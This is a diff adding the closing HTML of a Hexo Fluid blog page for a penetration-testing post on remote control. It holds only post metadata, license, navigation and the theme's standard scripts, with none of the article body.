+  <a href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">网络渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" class="print-no-link">#远程控制</a>
+      
+        <a href="/tags/%E6%B2%99%E7%AE%B1%E6%A3%80%E6%B5%8B/" class="print-no-link">#沙箱检测</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ch6：远程控制</div>
+      <div>https://asukayil.github.io/2026/11/22/ch6：远程控制/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>AsukaYi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/11/22/curl%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95%EF%BC%9A%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E7%9C%8B%E6%B8%85HTTP/" title="ch4作业：curl使用记录：一条命令看清HTTP">
+                        <span class="hidden-mobile">ch4作业：curl使用记录：一条命令看清HTTP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
